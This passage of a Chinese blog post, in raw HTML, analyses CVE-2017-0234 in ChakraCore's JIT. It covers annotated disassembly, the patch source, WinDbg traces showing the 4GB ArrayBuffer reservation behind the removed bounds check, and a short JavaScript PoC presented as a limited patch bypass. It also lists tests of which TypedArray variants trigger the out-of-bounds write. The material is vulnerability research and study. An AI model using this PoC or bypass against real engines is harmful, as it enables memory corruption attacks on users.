class=\"line\">000001E8AB960094 mov rax,qword ptr [r12+170h] </span><br><span class=\"line\">000001E8AB96009C xor ecx,ecx </span><br><span class=\"line\">000001E8AB96009E mov byte ptr [rbx+41D18h],1 </span><br><span class=\"line\">000001E8AB9600A5 mov byte ptr [rbx+41BBAh],3 </span><br><span class=\"line\">000001E8AB9600AC mov rdx,qword ptr [rdi+1784Ch] </span><br><span class=\"line\">000001E8AB9600B3 mov rdx,qword ptr [rdx+38h] </span><br><span class=\"line\">000001E8AB9600B7 mov byte ptr [rbx+41BBAh],0 </span><br><span class=\"line\">000001E8AB9600BE cmp byte ptr [rbx+41D18h],1 </span><br><span class=\"line\">000001E8AB9600C5 jne 000001E8AB9601CE </span><br><span class=\"line\">000001E8AB9600CB mov r8,r13 </span><br><span class=\"line\">000001E8AB9600CE mov r9,r8 </span><br><span class=\"line\">000001E8AB9600D1 shr r9,30h </span><br><span class=\"line\">000001E8AB9600D5 cmp r9,1 </span><br><span class=\"line\">000001E8AB9600D9 jne 000001E8AB9601E4 </span><br><span class=\"line\">000001E8AB9600DF mov r8d,r8d </span><br><span class=\"line\">000001E8AB9600E2 mov r9,rax </span><br><span class=\"line\">000001E8AB9600E5 mov r10,r9 </span><br><span class=\"line\">000001E8AB9600E8 shr r10,30h </span><br><span class=\"line\">000001E8AB9600EC cmp r10,1 </span><br><span class=\"line\">000001E8AB9600F0 jne 000001E8AB960231 </span><br><span class=\"line\">000001E8AB9600F6 mov r9d,r9d </span><br><span class=\"line\">000001E8AB9600F9 mov r10,r15 </span><br><span class=\"line\">000001E8AB9600FC mov r11,r10 </span><br><span class=\"line\">000001E8AB9600FF shr r11,30h </span><br><span class=\"line\">000001E8AB960103 cmp r11,1 </span><br><span class=\"line\">000001E8AB960107 jne 000001E8AB96028A </span><br><span class=\"line\">000001E8AB96010D mov r10d,r10d </span><br><span class=\"line\">000001E8AB960110 mov r11,rdx </span><br><span class=\"line\">000001E8AB960113 shr r11,30h </span><br><span class=\"line\">000001E8AB960117 jne 000001E8AB9602E4 </span><br><span class=\"line\">000001E8AB96011D cmp qword ptr [rdx],rsi </span><br><span class=\"line\">000001E8AB960120 jne 000001E8AB9602E4 </span><br><span class=\"line\">000001E8AB960126 mov esi,dword ptr [rdx+20h] </span><br><span class=\"line\">000001E8AB960129 cmp r10d,esi ----&gt;比较索引上界是否超出数组内存边界（检查上界）</span><br /></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></pre></td>\n  </tr>\n </table>\n</figure>\n<ul>\n <li>比较索引上界是否超出数组长度（检查上界）<br><img src=\"https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-04-071601.jpg\" alt=\"\" /></br></li>\n</ul>\n<figure class=\"highlight plain\">\n <table>\n  <tr>\n   <td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br /></br></br></br></br></br></br></br></pre></td>\n   <td class=\"code\"><pre><span class=\"line\">000001E8AB96012C  jg          000001E8AB9602F7  </span><br><span class=\"line\">000001E8AB960132  mov         rbx,qword ptr [rdx+38h]  </span><br><span class=\"line\">000001E8AB960136  mov         rsi,1DFAB6B0A78h  </span><br><span class=\"line\">000001E8AB960140  cmp         rsp,qword ptr [rsi]  </span><br><span class=\"line\">000001E8AB960143  jle         000001E8AB96032A  </span><br><span class=\"line\">000001E8AB960149 mov dword ptr [rdi+9397Ch],ecx </span><br><span class=\"line\">000001E8AB96014F inc ecx </span><br><span class=\"line\">000001E8AB960151 cmp r9d,r10d -----&gt;比较索引值是否到达索引上界</span><br /></br></br></br></br></br></br></br></pre></td>\n  </tr>\n </table>\n</figure>\n<ul>\n <li>比较索引值是否到达索引上界<br><img src=\"https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-04-071716.jpg\" alt=\"\">\n    <figure class=\"highlight plain\">\n     <table>\n      <tr>\n       <td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br /></br></br></br></br></br></br></br></br></br></pre></td>\n       <td class=\"code\"><pre><span class=\"line\">000001E8AB960154  jge         000001E8AB96019A  </span><br><span class=\"line\">000001E8AB960156  test        r9d,r9d  </span><br><span class=\"line\">000001E8AB960159  js          000001E8AB96033C  </span><br><span class=\"line\">000001E8AB96015F  mov         rsi,r14  </span><br><span class=\"line\">000001E8AB960162  mov         r11,rsi  </span><br><span class=\"line\">000001E8AB960165 shr r11,30h </span><br><span class=\"line\">000001E8AB960169 cmp r11,1 </span><br><span class=\"line\">000001E8AB96016D jne 000001E8AB960358 </span><br><span class=\"line\">000001E8AB960173 mov esi,esi </span><br><span class=\"line\">000001E8AB960175 mov dword ptr [rbx+r9*4],esi -----&gt;数组赋值</span><br /></br></br></br></br></br></br></br></br></br></pre></td>\n      </tr>\n     </table>\n    </figure></img></br></li>\n <li>数组赋值<br><img src=\"https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-04-071642.jpg\" alt=\"\" /></br></li>\n</ul>\n<h4 id=\"关于patch的思考\"><a href=\"http://eternalsakura13.com/2018/07/03/cve-2017-0234-3.0/#关于patch的思考\" class=\"headerlink\" title=\"关于patch的思考\"></a>关于patch的思考</h4>\n<figure class=\"highlight c++\">\n <table>\n  <tr>\n   <td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br /></br></br></br></br></br></pre></td>\n   <td class=\"code\"><pre><span class=\"line\">+                        <span class=\"keyword\">if</span> (lowerBound &gt;= <span class=\"number\">0</span> &amp;&amp; ((<span class=\"keyword\">static_cast</span>&lt;uint64&gt;(upperBound) &lt;&lt; indirScale) &lt; MAX_ASMJS_ARRAYBUFFER_LENGTH))</span><br><span class=\"line\">+                        {</span><br><span class=\"line\">+                            eliminatedLowerBoundCheck = <span class=\"literal\">true</span>;</span><br><span class=\"line\">+                            eliminatedUpperBoundCheck = <span class=\"literal\">true</span>;</span><br><span class=\"line\">+                            canBailOutOnArrayAccessHelperCall = <span class=\"literal\">false</span>;</span><br><span class=\"line\">+ }</span><br /></br></br></br></br></br></pre></td>\n  </tr>\n </table>\n</figure>\n<p>要绕过patch再次触发就要进入这个if body，(static_cast\n <uint64>\n  (upperBound) &lt;&lt; indirScale)的限制是要小于4GB，这应该和内存分配有关。\n  <br><code>var buffer = new ArrayBuffer(0x10000);</code><br>能否在进入if body的同时，又能OOB超出数组长度，就是后面需要思考的问题。</br></br>\n </uint64></p>\n<figure class=\"highlight c++\">\n <table>\n  <tr>\n   <td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br /></br></br></br></br></br></pre></td>\n   <td class=\"code\"><pre><span class=\"line\">IntConstantBounds idxConstantBounds;</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> (idxValue &amp;&amp; idxValue-&gt;GetValueInfo()-&gt;TryGetIntConstantBounds(&amp;idxConstantBounds))</span><br><span class=\"line\">                    {</span><br><span class=\"line\">                        BYTE indirScale = Lowerer::GetArrayIndirScale(baseValueType);</span><br><span class=\"line\">                        int32 upperBound = idxConstantBounds.UpperBound();</span><br><span class=\"line\"> int32 upperBound = idxConstantBounds.LowerBound();</span><br /></br></br></br></br></br></pre></td>\n  </tr>\n </table>\n</figure>\n<p>该段代码表示了程序试图获取ConstantBounds来赋值给idxConstantBounds从而控制upperBound&amp;lowerBound<br>因此PoC中需要构造常数边界来控制upperBound&amp;upperBound从而控制下列判断：</br></p>\n<figure class=\"highlight c++\">\n <table>\n  <tr>\n   <td class=\"gutter\"><pre><span class=\"line\">1</span><br /></pre></td>\n   <td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (lowerBound &gt;= <span class=\"number\">0</span> &amp;&amp; ((<span class=\"keyword\">static_cast</span>&lt;uint64&gt;(upperBound) &lt;&lt; indirScale) &lt; MAX_ASMJS_ARRAYBUFFER_LENGTH))</span><br /></pre></td>\n  </tr>\n </table>\n</figure>\n<figure class=\"highlight plain\">\n <table>\n  <tr>\n   <td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br /></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></pre></td>\n   <td class=\"code\"><pre><span class=\"line\">//回溯分析</span><br><span class=\"line\">//rax = idxOpnd</span><br><span class=\"line\">//if (idxOpnd) </span><br><span class=\"line\">//idxSym = idxOpnd-&gt;m_sym;</span><br><span class=\"line\">        //{</span><br><span class=\"line\"> //test rax,rax</span><br><span class=\"line\"> //...</span><br><span class=\"line\"> //mov rax,qword ptr [rax+8]</span><br><span class=\"line\"> //...</span><br><span class=\"line\"> //mov rcx,rax</span><br><span class=\"line\"> //...</span><br><span class=\"line\"> //StackSym::GetTypeEquivSym(IRType type, Func *func)</span><br><span class=\"line\"> //...</span><br><span class=\"line\"> //mov rax,qword ptr [rcx+30h]</span><br><span class=\"line\"> //}</span><br><span class=\"line\">//Value * idxValue = FindValue(idxSym); //rax</span><br><span class=\"line\">//IntConstantBounds idxConstantBounds; //rax</span><br><span class=\"line\">//if (idxValue &amp;&amp; idxValue-&gt;GetValueInfo()-&gt;TryGetIntConstantBounds(&amp;idxConstantBounds)) //rax</span><br /></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></pre></td>\n  </tr>\n </table>\n</figure>\n<p>经过测试，在patch了的函数那里下断，跟进到这个if判断,得到有限制的bypass patch PoC</p>\n<figure class=\"highlight javascript\">\n <table>\n  <tr>\n   <td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br /></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></pre></td>\n   <td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">write</span>(<span class=\"params\">j,number</span>)</span></span><br><span class=\"line\"><span class=\"function\"></span>{</span><br><span class=\"line\"> <span class=\"keyword\">for</span>(<span class=\"keyword\">var</span> i=<span class=\"number\">0</span>;i&lt;<span class=\"number\">0x10000</span>;i++) <span class=\"comment\">//create jit code</span></span><br><span class=\"line\"> {</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(j&gt;=<span class=\"number\">0</span> &amp;&amp; j&lt;=<span class=\"number\">0x6000000</span>) view[j]=number;</span><br><span class=\"line\"> }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> buffer = <span class=\"keyword\">new</span> <span class=\"built_in\">ArrayBuffer</span>(<span class=\"number\">0x10000</span>);</span><br><span class=\"line\"><span class=\"keyword\">var</span> view = <span class=\"keyword\">new</span> <span class=\"built_in\">Uint32Array</span>(buffer);</span><br><span class=\"line\"></span><br><span class=\"line\">write(<span class=\"number\">0x1234</span>,<span class=\"number\">1</span>) <span class=\"comment\">//jit create</span></span><br><span class=\"line\">write(<span class=\"number\">0x123456</span>,<span class=\"number\">1</span>) <span class=\"comment\">//bypass(limited) patch</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//mov r8,qword ptr [rbp-78h]=&nbsp;0600000000000000</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//R8 &nbsp;=&nbsp;06000000 00000000</span></span><br><span class=\"line\"><span class=\"comment\">// high low</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//test r8d,r8d r8d=0</span></span><br><span class=\"line\"><span class=\"comment\">//shr r8,20h r8=0x0000000006000000</span></span><br><span class=\"line\"><span class=\"comment\">//movsxd rdx,r8d rdx=0x06000000</span></span><br><span class=\"line\"><span class=\"comment\">//movzx ecx,al al=2</span></span><br><span class=\"line\"><span class=\"comment\">//shl rdx,cl </span></span><br><span class=\"line\"><span class=\"comment\">//mov rax,100000000h </span></span><br><span class=\"line\"><span class=\"comment\">//cmp rdx,rax</span></span><br /></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></pre></td>\n  </tr>\n </table>\n</figure>\n<h3 id=\"更多的思考\"><a href=\"http://eternalsakura13.com/2018/07/03/cve-2017-0234-3.0/#更多的思考\" class=\"headerlink\" title=\"更多的思考\"></a>更多的思考</h3>\n<p><del>chakra为什么这么优化，它涉及怎样的一个pattern，这样优化和buffer相关的点有哪些？</del></p>\n<ol>\n <li>为什么JIT优化去掉边界？它为什么会去掉边界？（和4GB有关，这种特殊的buffer分配方式）</li>\n <li>PoC能否修改？怎么修改？思考如下：</li>\n</ol>\n<ul>\n <li>不同的对象能否触发？举例：一定要是Uint32Array或者ArrayBuffer么?</li>\n <li>是否一定用到循环？去掉循环行不行？怎么精简PoC?</li>\n</ul>\n<h3 id=\"JIT优化-amp-amp-内存分配\"><a href=\"http://eternalsakura13.com/2018/07/03/cve-2017-0234-3.0/#JIT优化-amp-amp-内存分配\" class=\"headerlink\" title=\"JIT优化&amp;&amp;内存分配\"></a>JIT优化&amp;&amp;内存分配</h3>\n<p>经过进一步对内存分配的调试（首先我在windbg里对windows API下断,参考了<a href=\"https://labs.portcullis.co.uk/blog/cve-2015-5119-flash-bytearray-uaf-a-beginners-walkthrough/\" target=\"_blank\" rel=\"noopener\">这篇</a>，然后回溯确实跟到了VirtualAlloc，不过和我找的不是同一个。<br><img src=\"https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-08-031720.jpg\" alt=\"\" /></br></p>\n<figure class=\"highlight plain\">\n <table>\n  <tr>\n   <td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br /></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></pre></td>\n   <td class=\"code\"><pre><span class=\"line\">0:000&gt; bp KERNEL32!VirtualAllocStub</span><br><span class=\"line\">0:000&gt; g</span><br><span class=\"line\">ModLoad: 00007ffc`0e250000 00007ffc`0fc52000   D:\\chakracore\\ChakraCore\\Build\\VcBuild\\bin\\x64_debug\\chakracore.dll</span><br><span class=\"line\">ModLoad: 00007ffc`55f90000 00007ffc`560d5000   C:\\windows\\System32\\ole32.dll</span><br><span class=\"line\">ModLoad: 00007ffc`54030000 00007ffc`54057000   C:\\windows\\System32\\GDI32.dll</span><br><span class=\"line\">ModLoad: 00007ffc`529c0000 00007ffc`52b47000 C:\\windows\\System32\\gdi32full.dll</span><br><span class=\"line\">ModLoad: 00007ffc`53780000 00007ffc`538ca000 C:\\windows\\System32\\USER32.dll</span><br><span class=\"line\">ModLoad: 00007ffc`529a0000 00007ffc`529be000 C:\\windows\\System32\\win32u.dll</span><br><span class=\"line\">ModLoad: 00007ffc`53f10000 00007ffc`53f69000 C:\\windows\\System32\\sechost.dll</span><br><span class=\"line\">ModLoad: 00007ffc`53b90000 00007ffc`53c31000 C:\\windows\\System32\\ADVAPI32.dll</span><br><span class=\"line\">ModLoad: 00007ffc`406c0000 00007ffc`40869000 C:\\windows\\SYSTEM32\\dbghelp.dll</span><br><span class=\"line\">ModLoad: 00007ffc`40b50000 00007ffc`40b79000 C:\\windows\\SYSTEM32\\dbgcore.DLL</span><br><span class=\"line\">ModLoad: 00007ffc`54190000 00007ffc`541bd000 C:\\windows\\System32\\IMM32.DLL</span><br><span class=\"line\">Breakpoint 0 hit</span><br><span class=\"line\">KERNEL32!VirtualAllocStub:</span><br><span class=\"line\">00007ffc`53f99800 48ff2569c60500 jmp qword ptr [KERNEL32!_imp_VirtualAlloc (00007ffc`53ff5e70)] ds:00007ffc`53ff5e70={KERNELBASE!VirtualAlloc (00007ffc`532aafc0)}</span><br><span class=\"line\">…</span><br><span class=\"line\">0:000&gt; k</span><br><span class=\"line\"> # Child-SP RetAddr Call Site</span><br><span class=\"line\">00 00000030`208fec08 00007ffc`0e34bfe2 KERNEL32!VirtualAllocStub</span><br><span class=\"line\">01 00000030`208fec10 00007ffc`0e252610 chakracore!Memory::X64WriteBarrierCardTableManager::Initialize+0x82 [d:\\chakracore\\chakracore\\lib\\common\\memory\\recyclerwritebarriermanager.cpp @ 232] </span><br><span class=\"line\">02 00000030`208fec70 00007ffc`0f0e647d chakracore!`dynamic initializer for 'Memory::RecyclerWriteBarrierManager::cardTable''+0x10 [d:\\chakracore\\chakracore\\lib\\common\\memory\\recyclerwritebarriermanager.cpp @ 29] </span><br><span class=\"line\">03 00000030`208feca0 00007ffc`0f0641bd chakracore!_initterm+0x5d [d:\\th\\minkernel\\crts\\ucrt\\src\\appcrt\\startup\\initterm.cpp @ 22] </span><br><span class=\"line\">04 00000030`208fece0 00007ffc`0f0640b7 chakracore!dllmain_crt_process_attach+0xbd [f:\\dd\\vctools\\crt\\vcstartup\\src\\startup\\dll_dllmain.cpp @ 67] </span><br><span class=\"line\">05 00000030`208fed30 00007ffc`0f064345 chakracore!dllmain_crt_dispatch+0x47 [f:\\dd\\vctools\\crt\\vcstartup\\src\\startup\\dll_dllmain.cpp @ 133] </span><br><span class=\"line\">06 00000030`208fed70 00007ffc`0f0644c1 chakracore!dllmain_dispatch+0x75 [f:\\dd\\vctools\\crt\\vcstartup\\src\\startup\\dll_dllmain.cpp @ 190] </span><br><span class=\"line\">07 00000030`208fedc0 00007ffc`5622485f chakracore!_DllMainCRTStartup+0x31 [f:\\dd\\vctools\\crt\\vcstartup\\src\\startup\\dll_dllmain.cpp @ 249] </span><br><span class=\"line\">08 00000030`208fedf0 00007ffc`5624d762 ntdll!LdrpCallInitRoutine+0x6b</span><br><span class=\"line\">09 00000030`208fee60 00007ffc`5624d5ab ntdll!LdrpInitializeNode+0x15a</span><br><span class=\"line\">0a 00000030`208fef80 00007ffc`56247045 ntdll!LdrpInitializeGraphRecurse+0x73</span><br><span class=\"line\">0b 00000030`208fefc0 00007ffc`5621d690 ntdll!LdrpPrepareModuleForExecution+0xc5</span><br><span class=\"line\">0c 00000030`208ff000 00007ffc`5621d273 ntdll!LdrpLoadDllInternal+0x1a4</span><br><span class=\"line\">0d 00000030`208ff080 00007ffc`5621c3cc ntdll!LdrpLoadDll+0x107</span><br><span class=\"line\">0e 00000030`208ff220 00007ffc`5328eb02 ntdll!LdrLoadDll+0x8c</span><br><span class=\"line\">0f 00000030`208ff320 00007ffc`532ba6d1 KERNELBASE!LoadLibraryExW+0x152</span><br><span class=\"line\">10 00000030`208ff390 00007ff6`ee0d5509 KERNELBASE!LoadLibraryExA+0x31</span><br><span class=\"line\">11 00000030`208ff3d0 00007ff6`ee0d55e9 CH!LoadChakraCore+0x19 [d:\\chakracore\\chakracore\\bin\\ch\\chakrartinterface.cpp @ 38] </span><br><span class=\"line\">12 00000030`208ff400 00007ff6`ee0d51ac CH!ChakraRTInterface::LoadChakraDll+0xd9 [d:\\chakracore\\chakracore\\bin\\ch\\chakrartinterface.cpp @ 67] </span><br><span class=\"line\">13 00000030`208ff7b0 00007ff6`ee0efee4 CH!wmain+0x61c [d:\\chakracore\\chakracore\\bin\\ch\\ch.cpp @ 942] </span><br><span class=\"line\">14 00000030`208ff910 00007ff6`ee0efdf7 CH!invoke_main+0x34 [f:\\dd\\vctools\\crt\\vcstartup\\src\\startup\\exe_common.inl @ 80] </span><br><span class=\"line\">15 00000030`208ff950 00007ff6`ee0efcbe CH!__scrt_common_main_seh+0x127 [f:\\dd\\vctools\\crt\\vcstartup\\src\\startup\\exe_common.inl @ 253] </span><br><span class=\"line\">16 00000030`208ff9b0 00007ff6`ee0efef9 CH!__scrt_common_main+0xe [f:\\dd\\vctools\\crt\\vcstartup\\src\\startup\\exe_common.inl @ 296] </span><br><span class=\"line\">17 00000030`208ff9e0 00007ffc`53f92784 CH!wmainCRTStartup+0x9 [f:\\dd\\vctools\\crt\\vcstartup\\src\\startup\\exe_wmain.cpp @ 17] </span><br><span class=\"line\">18 00000030`208ffa10 00007ffc`56270d51 KERNEL32!BaseThreadInitThunk+0x14</span><br><span class=\"line\">19 00000030`208ffa40 00000000`00000000 ntdll!RtlUserThreadStart+0x21</span><br /></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></pre></td>\n  </tr>\n </table>\n</figure>\n<p>于是全局搜索MEM_COMMIT，在ArrayBuffer.h里找到线索，并调试确认。<br>结论如下：<br>在为ArrayBuffer进行内存分配时，会对长度有一个判断。<br><img src=\"https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-08-032016.jpg\" alt=\"\"><br>并根据这个判断的返回结果，决定使用Virtual Alloc（AllocWrapper是一个包装）还是malloc来分配内存。<br>这主要是根据length的长度和”标志位“。<br><img src=\"https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-08-032100.jpg\" alt=\"\"><br>如果是用Virtual Alloc分配(关于这种分配方式的参数，可以参考<a href=\"https://msdn.microsoft.com/en-us/library/windows/desktop/aa366887(v=vs.85).aspx\" target=\"_blank\" rel=\"noopener\">MSDN</a>)<br><img src=\"https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-08-032346.jpg\" alt=\"\"><br>那么为ArrayBuffer分配的保留空间大小为4GB<br><img src=\"https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-08-032430.jpg\" alt=\"\"><br>随后COMMIT真正使用的大小，也就是PoC里的0x10000<br><img src=\"https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-08-032701.jpg\" alt=\"\" /></br></br></img></br></br></img></br></br></img></br></br></br></img></br></br></br></p>\n<p>JIT在优化的时候会因为我们给这个Buffer分配的内存足够大（4GB），就去掉了边界检查，但其实这是一个安全隐患。</p>\n<h3 id=\"Pattern匹配\"><a href=\"http://eternalsakura13.com/2018/07/03/cve-2017-0234-3.0/#Pattern匹配\" class=\"headerlink\" title=\"Pattern匹配\"></a>Pattern匹配</h3>\n<p>我尝试着替换ArrayBuffer，寻找和此处bug逻辑相似的地方，在源码里搜索，不过暂时没有找到疑似的地方。</p>\n<h3 id=\"触发条件-修改PoC\"><a href=\"http://eternalsakura13.com/2018/07/03/cve-2017-0234-3.0/#触发条件-修改PoC\" class=\"headerlink\" title=\"触发条件(修改PoC)\"></a>触发条件(修改PoC)</h3>\n<figure class=\"highlight c++\">\n <table>\n  <tr>\n   <td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br /></br></br></br></br></br></br></br></br></br></br></br></br></br></br></pre></td>\n   <td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (baseValueType.IsLikelyOptimizedVirtualTypedArray() &amp;&amp; !Js::IsSimd128LoadStore(instr-&gt;m_opcode) <span class=\"comment\">/*Always extract bounds for SIMD */</span>)</span><br><span class=\"line\"> {</span><br><span class=\"line\">     <span class=\"keyword\">if</span> (isProfilableStElem ||</span><br><span class=\"line\">         !instr-&gt;IsDstNotAlwaysConvertedToInt32() ||</span><br><span class=\"line\">         ( (baseValueType.GetObjectType() == ObjectType::Float32VirtualArray ||</span><br><span class=\"line\"> baseValueType.GetObjectType() == ObjectType::Float64VirtualArray) &amp;&amp;</span><br><span class=\"line\"> !instr-&gt;IsDstNotAlwaysConvertedToNumber()</span><br><span class=\"line\"> )</span><br><span class=\"line\"> )</span><br><span class=\"line\"> {</span><br><span class=\"line\"> eliminatedLowerBoundCheck = <span class=\"literal\">true</span>;</span><br><span class=\"line\"> eliminatedUpperBoundCheck = <span class=\"literal\">true</span>;</span><br><span class=\"line\"> canBailOutOnArrayAccessHelperCall = <span class=\"literal\">false</span>;</span><br><span class=\"line\"> }</span><br><span class=\"line\"> }</span><br /></br></br></br></br></br></br></br></br></br></br></br></br></br></br></pre></td>\n  </tr>\n </table>\n</figure>\n<ol>\n <li>替换控制ArrayBuffer的对象</li>\n <li>测试case</li>\n</ol>\n<h4 id=\"TypeView\"><a href=\"http://eternalsakura13.com/2018/07/03/cve-2017-0234-3.0/#TypeView\" class=\"headerlink\" title=\"TypeView\"></a>TypeView</h4>\n<p>PoC里用的是Uint32Array，其实TypedView只要宽度大于一个字节都是可以的<br>下面这些都测试成功。（其实主要常用的写exp的还是FloatArray）</br></p>\n<figure class=\"highlight plain\">\n <table>\n  <tr>\n   <td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br /></br></br></br></br></br></br></br></br></br></pre></td>\n   <td class=\"code\"><pre><span class=\"line\">Uint8Array();-</span><br><span class=\"line\">Uint16Array();+</span><br><span class=\"line\">Uint32Array();+</span><br><span class=\"line\"></span><br><span class=\"line\">Int8Array();-</span><br><span class=\"line\">Int16Array();+</span><br><span class=\"line\">Int32Array();+</span><br><span class=\"line\"></span><br><span class=\"line\">Float32Array();+</span><br><span class=\"line\">Float64Array();+</span><br /></br></br></br></br></br></br></br></br></br></pre></td>\n  </tr>\n </table>\n</figure>\n<h4 id=\"DataView\"><a href=\"http://eternalsakura13.com/2018/07/03/cve-2017-0234-3.0/#DataView\" class=\"headerlink\" title=\"DataView\"></a>DataView</h4>\n<ul>\n <li>JSObject\n  <ul>\n   <li>JSArray\n    <ul>\n     <li>JSArrayBuffer</li>\n     <li>JSArrayBufferView\n      <ul>\n       <li>JSTypedArray</li>\n       <li>JSDataView</li>\n      </ul></li>\n    </ul></li>\n  </ul></li>\n</ul>\n<p>ArrayBuffer需要用TypedArray或DataView来实际访问。<br>而为了Exploit，最好不要做多余的事情（当发生意想不到的事情时很麻烦），因此比起DataView，我们更多的使用TypedArray。<br>不过我这里还是测试了一下DataView，没有成功。</br></br></p>\n<figure class=\"highlight javascript\">\n <table>\n  <tr>\n   <td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br /></br></br></br></br></br></br></br></br></pre></td>\n   <td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">write</span>(<span class=\"params\">begin, end, step, num</span>) </span>{</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span 